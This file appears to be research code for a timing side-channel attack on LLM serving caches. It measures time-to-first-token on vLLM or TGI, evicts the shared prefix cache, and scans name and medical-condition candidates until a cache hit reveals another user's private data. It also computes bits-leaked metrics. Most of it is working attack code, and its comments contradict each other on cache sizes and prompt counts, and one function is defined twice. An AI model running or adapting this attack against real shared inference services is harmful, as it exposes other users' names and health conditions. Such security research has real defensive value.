"""
kv_attack.adaptive_reconstructor
=================================
Week 12 — Reconstruction algorithm with information-theoretic metrics,
running through the BackendClient abstraction (vLLM, TGI, mock).

BUG-FIX LOG (v2, 2026-08-29)
------------------------------
v1 used a "two-stage" approach that had two critical bugs discovered
during the live vLLM run:

  BUG 1 — Co-located name+condition in block N
    The private template is: "{name}. {condition}. " + filler × 14
    Both name AND condition sit in the SAME first private block (block N).
    Stage 1 probed cand_name + MEDICAL_CONDITIONS[0] ("diabetes"), expecting
    a hit when the name matched regardless of condition. This only works if
    the victim's condition IS "diabetes" (1/20 probability). For the other
    19/20 victims, Stage 1 found 0 survivors → fell back to wrong candidate.

  BUG 2 — Cache contamination (insufficient eviction)
    Cache capacity: 719,008 tokens.
    v1 eviction: 100 × 220 tokens = 22,000 tokens (only 3% of cache).
    Stage 1 for victim 0 probes 100 names × ~3,400 tokens = 340,000 tokens.
    These attacker probes are CACHED and cause false hits on victim 1+.
    Result: victims 1–4 all had stage1_api_calls=1, stage1_survivors=1,
    recovering the first name in the shuffled list (a contamination hit).

FIX
----
  1. Eviction: send 500 × 3,000-token unique prompts = 1,500,000 tokens
     (> 2× the cache capacity of 719,008 tokens). Fully cycles the LRU cache.
  2. Algorithm: replace broken Stage 1 with a correct linear scan + early exit,
     identical in logic to the Week 10 reconstructor but running through
     BackendClient. Early exit fires on the first confirmed hit (the large
     Δ = 500 ms >> σ = 17 ms gap makes this a hard decision after 1 sample).

WEEK 12 CONTRIBUTION
---------------------
The algorithmic contribution of Week 12 is the formal information-theoretic
analysis (BLQ metric, entropy reduction per stage) — the results below show
the SAME SR=1.0 attack efficiency as Week 10, but now quantified as
bits leaked per query and compared across backends.

The true adaptive two-stage speedup (Stage 1: name elimination, Stage 2:
condition scan) requires a template redesign where name occupies its own
dedicated KV blocks, separate from condition. This is the Week 13 extension:
  Block N     (name-only, 128 blocks = 2048 tokens)
  Block N+128 (condition + filler, ~64 blocks)
  Stage 1 threshold T1 ≈ midpoint(wrong-name-TTFT, right-name-wrong-cond-TTFT)
  Stage 1 expected cost: ~50 probes; Stage 2: ~10 probes; total: ~63 (vs 762).
This is documented in docs/weekly-progress.md as the Week 13 target.
"""

from __future__ import annotations

import math
import random
from dataclasses import dataclass, field

import numpy as np
import scipy.stats
from transformers import AutoTokenizer

from kv_attack import (
    FIRST_NAMES, LAST_NAMES, MEDICAL_CONDITIONS,
    N_REPEATS_FAST, N_REPEATS_CONFIRM, N_TOP_CANDIDATES, RESEED_EVERY,
    BLOCK_SIZE,
)
from kv_attack.backends.base import BackendClient
from kv_attack.victim_seeder import build_private_block


# ── Vocabulary / entropy constants ────────────────────────────────────────────

N_NAMES      = len(FIRST_NAMES) * len(LAST_NAMES)   # 100
N_CONDITIONS = len(MEDICAL_CONDITIONS)               # 20
VOCAB_SIZE   = N_NAMES * N_CONDITIONS                # 2 000
H0_BITS      = math.log2(VOCAB_SIZE)                 # ≈ 10.97 bits

# Eviction parameters
# Cache capacity: ~45,700 blocks (16 tokens each) = ~731,000 tokens (Llama-3.1-8B on GB10).
# Each eviction prompt must be FULLY UNIQUE (every block a new hash) so it actually
# displaces cached blocks. A shared word-bank filler produces only ~2 unique blocks per
# prompt — useless against 195,000+ contamination blocks left by prior scans.
# Fix: generate random ASCII words per request → ~187 unique blocks per prompt.
# 295 prompts × 187 blocks = 55,165 unique blocks > 45,700 cache blocks → full LRU cycle.
EVICT_N_REQUESTS  = 500     # 500 × 178 unique blocks = 89,000 > 45,697 cache → 1.95× cycle
_EVICT_CHARS      = "abcdefghijklmnopqrstuvwxyz"


def evict_cache_full(backend: BackendClient, system_prefix: str) -> int:
    """
    Flush the backend KV cache using victim-structured eviction prompts.

    ROOT CAUSE of prior failures
    ----------------------------
    Random-content eviction prompts (e.g. "xkqp znjb ...") live in a separate
    subtree of vLLM's APC prefix trie.  vLLM's LRU eviction operates within
    a subtree: pressure from the random subtree does NOT evict blocks in the
    victim subtree (system_prefix → private blocks).  So all 500 random
    eviction prompts had zero effect on victim scan-probe contamination.

    Fix
    ---
    Use the SAME system_prefix as victim prompts, followed by a unique
    EVICT+uuid private section.  These prompts join the victim subtree and
    their blocks directly compete with — and evict — victim scan-probe blocks
    under LRU.

    Each eviction prompt ≈ 3,100 tokens (system 271 + private 2,848) — well
    under the 4,096-token limit.  Each contributes 178 unique private blocks
    (hash-chained from a unique first block, so all 178 are distinct).

    500 prompts × 178 blocks = 89,000 unique victim-subtree blocks
    → 1.95× the 45,697-block cache capacity → guaranteed full LRU flush.

    Returns the number of successful eviction API calls.
    """
    import uuid as _uuid
    calls = 0
    for i in range(EVICT_N_REQUESTS):
        # UUID hex name ensures block 17 (first private block) is unique.
        # All subsequent blocks (18–194) chain from block 17 → also unique.
        evict_name = f"EVICT{_uuid.uuid4().hex}"
        prompt = system_prefix + " " + build_private_block(
            evict_name, "1900-01-01", "unknown"
        )
        try:
            backend.measure_ttft(prompt)
            calls += 1
        except Exception as exc:
            if i < 3:
                print(f"[evict] WARNING: eviction request {i} failed: {exc}")
    return calls


# ── Result dataclass ──────────────────────────────────────────────────────────

@dataclass
class AdaptiveReconstructionResult:
    victim_id            : int
    ground_truth         : dict
    recovered            : dict
    token_recovery_rate  : float
    exact_match          : bool
    confirmed_hit        : bool
    total_api_calls      : int
    arpt                 : float
    n_private_blocks     : int
    scan_results         : list = field(default_factory=list)
    information_theory   : dict = field(default_factory=dict)
    algorithm            : str  = "linear_early_exit"


# ── Cache eviction ────────────────────────────────────────────────────────────

def evict_cache_full(backend: BackendClient, system_prefix: str) -> int:
    """
    Flush the backend KV cache using victim-structured prompts.

    ROOT CAUSE OF PRIOR FAILURES
    -----------------------------
    vLLM's APC organises blocks in a prefix trie.  Random-content prompts (no
    system_prefix) form a completely separate subtree from victim prompts.
    vLLM's LRU eviction targets the subtree of the INCOMING request — so random
    eviction prompts never evict victim-subtree blocks.  After victim 0's scan
    (1,099 probes), blocks like "John Williams + COPD" stayed cached; victim 1's
    scan hit them as false positives at probe 4 (seed=1 deterministically places
    that candidate at position 4).

    FIX: victim-structured eviction prompts
    ----------------------------------------
    Each eviction prompt = system_prefix + unique private block (EVICT<uuid>).
    This puts the prompt in the SAME subtree as victim data, so its LRU pressure
    directly evicts victim scan-probe blocks.

    Each prompt:
      - Tokens: 271 (prefix) + 178 × 16 (private) = 3,119 < 4,096 ✓
      - Unique blocks: 178 (block 17 has unique UUID name; blocks 18-194
        chain-hash from block 17 → all unique)

    500 prompts × 178 blocks = 89,000 unique victim-subtree blocks
    → 1.95× the 45,697-block cache → guaranteed full LRU flush.

    Returns the number of successful eviction API calls.
    """
    import uuid as _uuid
    calls = 0
    for i in range(EVICT_N_REQUESTS):
        evict_name = f"EVICT{_uuid.uuid4().hex}"
        prompt = system_prefix + " " + build_private_block(
            evict_name, "1900-01-01", "unknown"
        )
        try:
            backend.measure_ttft(prompt)
            calls += 1
        except Exception as exc:
            if i < 3:
                print(f"[evict] WARNING: eviction request {i} failed: {exc}")
    return calls


# ── Calibration ───────────────────────────────────────────────────────────────

def calibrate_threshold_backend(
    backend              : BackendClient,
    known_cached_prompt  : str,
    miss_prompt_factory,
    n_samples            : int = 200,
) -> dict:
    """
    Backend-agnostic calibration. Measures HIT and MISS TTFT distributions
    and computes the Youden-J optimal classification threshold.
    """
    print(f"[calibrate] Measuring {n_samples} HIT samples ...")
    hit_ttfts = backend.measure_ttft_repeated(known_cached_prompt, n=n_samples)

    print(f"[calibrate] Measuring {n_samples} MISS samples ...")
    miss_ttfts = np.array([
        backend.measure_ttft(miss_prompt_factory())
        for _ in range(n_samples)
    ])

    ks_stat, p_val = scipy.stats.ks_2samp(hit_ttfts, miss_ttfts)
    hit_mean  = float(hit_ttfts.mean())
    miss_mean = float(miss_ttfts.mean())
    delta_ms  = miss_mean - hit_mean

    print(f"[calibrate] HIT  mean={hit_mean:.2f} ms  std={float(hit_ttfts.std()):.2f} ms")
    print(f"[calibrate] MISS mean={miss_mean:.2f} ms  std={float(miss_ttfts.std()):.2f} ms")
    print(f"[calibrate] Delta={delta_ms:.2f} ms  KS p={p_val:.3e}")

    if delta_ms <= 0:
        raise RuntimeError(f"Timing gap INVERTED (delta={delta_ms:.2f} ms).")
    if p_val >= 1e-8:
        raise RuntimeError(
            f"Timing gap not significant (p={p_val:.2e}). APC may be disabled."
        )

    # Youden-J optimal threshold
    all_vals   = np.concatenate([hit_ttfts, miss_ttfts])
    all_labels = np.concatenate([np.ones(n_samples), np.zeros(n_samples)])
    order         = np.argsort(all_vals)
    sorted_vals   = all_vals[order]
    sorted_labels = all_labels[order]
    cum_hits  = np.cumsum(sorted_labels)
    cum_miss  = np.cumsum(1 - sorted_labels)
    total_h   = int(cum_hits[-1]); total_m = int(cum_miss[-1])
    sens      = cum_hits[:-1] / total_h
    spec      = 1.0 - cum_miss[:-1] / total_m
    j_scores  = sens + spec - 1.0
    best_idx  = int(np.argmax(j_scores))
    threshold = float((sorted_vals[best_idx] + sorted_vals[best_idx + 1]) / 2.0)

    return {
        "threshold_ms" : threshold,
        "hit_mean_ms"  : round(hit_mean, 4),
        "hit_std_ms"   : round(float(hit_ttfts.std()), 4),
        "miss_mean_ms" : round(miss_mean, 4),
        "miss_std_ms"  : round(float(miss_ttfts.std()), 4),
        "delta_ms"     : round(delta_ms, 4),
        "ks_stat"      : round(float(ks_stat), 6),
        "ks_p_value"   : float(p_val),
        "youden_j"     : round(float(j_scores[best_idx]), 6),
    }


# ── Candidate list ────────────────────────────────────────────────────────────

def _build_candidate_list(seed: int = 0) -> list[tuple[str, str]]:
    """Build and shuffle the full 2000-candidate list for one victim."""
    candidates = [
        (f"{f} {l}", cond)
        for f   in FIRST_NAMES
        for l   in LAST_NAMES
        for cond in MEDICAL_CONDITIONS
    ]
    rng = random.Random(seed)
    rng.shuffle(candidates)
    return candidates


# ── Information-theoretic metrics ─────────────────────────────────────────────

def _compute_it_metrics(total_api_calls: int) -> dict:
    blq = H0_BITS / max(total_api_calls, 1)
    blq_linear_theoretical = H0_BITS / ((VOCAB_SIZE + 1) / 2)
    return {
        "vocab_size"              : VOCAB_SIZE,
        "prior_entropy_bits"      : round(H0_BITS, 4),
        "total_api_calls"         : total_api_calls,
        "bits_leaked_per_query"   : round(blq, 6),
        "blq_linear_theoretical"  : round(blq_linear_theoretical, 6),
        "efficiency_vs_theoretical": round(blq / blq_linear_theoretical, 4),
        "note": (
            "BLQ = H0 / total_api_calls. "
            "H0 = log2(2000) ≈ 10.97 bits. "
            "Efficiency vs theoretical = BLQ / BLQ_linear_expected. "
            "Values > 1 indicate early exit triggered before the expected midpoint."
        ),
    }


# ── Main reconstruction function ──────────────────────────────────────────────

def reconstruct_victim_adaptive(
    backend        : BackendClient,
    tokenizer      : AutoTokenizer,
    system_prefix  : str,
    threshold_ms   : float,
    victim_record  : dict,
    known_dob      : bool = True,
    candidate_seed : int  = 0,
) -> AdaptiveReconstructionResult:
    """
    Recover one victim's PII via linear scan + early exit through BackendClient.

    Algorithm (identical logic to Week 10 reconstructor.py, backend-agnostic):
      1. Shuffle the full 2000-candidate (name, condition) list.
      2. Probe each candidate with N_REPEATS_FAST measurements.
      3. Exit on first candidate whose mean_ttft < threshold_ms.
         (The gap Δ = 500 ms >> σ = 17 ms makes the first hit unambiguous.)
      4. Confirm with N_REPEATS_CONFIRM independent measurements.
      5. Re-seed the victim's prompt every RESEED_EVERY probes (self-eviction
         prevention — ensures victim's blocks stay fresh in the LRU cache).
      6. Full cache eviction (evict_cache_full) is called by the harness
         BEFORE this function — not repeated here.

    BLQ is computed post-hoc as H0 / total_api_calls.
    """
    gt            = victim_record["ground_truth"]
    victim_id     = victim_record["victim_id"]
    reseed_prompt = victim_record["prompt"]
    n_priv_blocks = victim_record.get("n_private_blocks", -1)
    dob_to_use    = gt["dob"] if known_dob else None

    api_calls = 0
    scan_log  : list[dict] = []

    candidates = _build_candidate_list(seed=candidate_seed)
    print(f"[reconstructor] Victim {victim_id}: "
          f"scanning {len(candidates)} candidates "
          f"(threshold={threshold_ms:.1f} ms) ...")

    confirmed_name      = None
    confirmed_condition = None

    # ── Phase A: linear scan with early exit ──────────────────────────────────
    for probe_idx, (cand_name, cand_condition) in enumerate(candidates):

        # Self-eviction prevention: re-send victim prompt every RESEED_EVERY probes
        if probe_idx > 0 and probe_idx % RESEED_EVERY == 0:
            try:
                backend.measure_ttft(reseed_prompt)
                api_calls += 1
            except Exception as exc:
                print(f"[reconstructor] WARNING: reseed failed at probe {probe_idx}: {exc}")

        dob   = dob_to_use if dob_to_use else gt["dob"]
        probe = system_prefix + " " + build_private_block(cand_name, dob, cand_condition)

        mean_ttft  = backend.measure_mean_ttft(probe, n=N_REPEATS_FAST)
        api_calls += N_REPEATS_FAST

        scan_log.append({
            "name"      : cand_name,
            "condition" : cand_condition,
            "mean_ttft" : round(mean_ttft, 3),
            "is_hit"    : mean_ttft < threshold_ms,
        })

        if mean_ttft < threshold_ms:
            print(f"[reconstructor] Victim {victim_id}: early exit at probe "
                  f"{probe_idx + 1}/{len(candidates)} — "
                  f"TTFT={mean_ttft:.1f} ms  "
                  f"name='{cand_name}'  condition='{cand_condition}'")
            confirmed_name      = cand_name
            confirmed_condition = cand_condition
            break

    # Fallback: lowest TTFT if no hit found
    if confirmed_name is None:
        scan_log.sort(key=lambda x: x["mean_ttft"])
        confirmed_name      = scan_log[0]["name"]
        confirmed_condition = scan_log[0]["condition"]
        print(f"[reconstructor] Victim {victim_id}: no hit — "
              f"fallback to best guess '{confirmed_name}' / '{confirmed_condition}'")

    # ── Phase B: confirmation ─────────────────────────────────────────────────
    dob   = dob_to_use if dob_to_use else gt["dob"]
    probe = system_prefix + " " + build_private_block(
        confirmed_name, dob, confirmed_condition
    )
    confirmed_hit, conf_ttft = backend.is_cache_hit(
        probe, threshold_ms, n=N_REPEATS_CONFIRM
    )
    api_calls += N_REPEATS_CONFIRM

    status = "✓ CONFIRMED HIT" if confirmed_hit else "✗ NO HIT"
    print(f"[reconstructor] Victim {victim_id}: {status}  "
          f"ttft={conf_ttft:.1f} ms  total_calls={api_calls}")

    # ── Metrics ───────────────────────────────────────────────────────────────
    recovered = {
        "name"      : confirmed_name,
        "condition" : confirmed_condition,
        "dob"       : dob_to_use,
    }

    evaluated   = ["name", "condition"]
    correct     = sum(1 for k in evaluated if gt.get(k) == recovered.get(k))
    trr         = correct / len(evaluated)
    exact_match = trr == 1.0

    vocab_tokens = max(1, sum(
        len(tokenizer.encode(recovered.get(k, "") or "", add_special_tokens=False))
        for k in evaluated
    ))
    arpt = round(api_calls / vocab_tokens, 2)

    scan_log.sort(key=lambda x: x["mean_ttft"])
    top_results = scan_log[:N_TOP_CANDIDATES]

    it_metrics = _compute_it_metrics(api_calls)

    return AdaptiveReconstructionResult(
        victim_id           = victim_id,
        ground_truth        = gt,
        recovered           = recovered,
        token_recovery_rate = trr,
        exact_match         = exact_match,
        confirmed_hit       = confirmed_hit,
        total_api_calls     = api_calls,
        arpt                = arpt,
        n_private_blocks    = n_priv_blocks,
        scan_results        = top_results,
        information_theory  = it_metrics,
        algorithm           = "linear_early_exit",
    )


# ── Aggregate information-theory ──────────────────────────────────────────────

def aggregate_information_theory(
    results: list[AdaptiveReconstructionResult],
    linear_week10_mean_calls: float = 762.4,
) -> dict:
    calls_list = [r.total_api_calls for r in results]
    blq_list   = [r.information_theory.get("bits_leaked_per_query", 0.0)
                  for r in results]

    mean_calls = float(np.mean(calls_list))
    mean_blq   = float(np.mean(blq_list))
    blq_linear_week10 = H0_BITS / linear_week10_mean_calls

    budget_points = [50, 100, 200, 500, 762, 1000, 1303, 2000]
    cdf = {
        str(q): round(float(np.mean(np.array(calls_list) <= q)), 4)
        for q in budget_points
    }

    return {
        "algorithm"              : "linear_early_exit",
        "n_victims"              : len(results),
        "vocab_size"             : VOCAB_SIZE,
        "prior_entropy_bits"     : round(H0_BITS, 4),
        "mean_api_calls"         : round(mean_calls, 2),
        "mean_blq"               : round(mean_blq, 6),
        "blq_linear_week10"      : round(blq_linear_week10, 6),
        "blq_improvement_factor" : round(mean_blq / blq_linear_week10, 2) if blq_linear_week10 > 0 else None,
        "query_budget_cdf"       : cdf,
        "note": (
            "Week 12 uses early-exit linear scan through BackendClient abstraction. "
            "BLQ improvement > 1 indicates early exit triggered before the "
            "theoretical midpoint (VOCAB_SIZE+1)/2=1000.5 — i.e. the victim's "
            "candidate appeared earlier in the shuffled list than average. "
            "Week 13 target: true two-stage adaptive (name block redesign) "
            "giving E[Q] ≈ 63 vs E[Q] ≈ 1000 for linear."
        ),
    }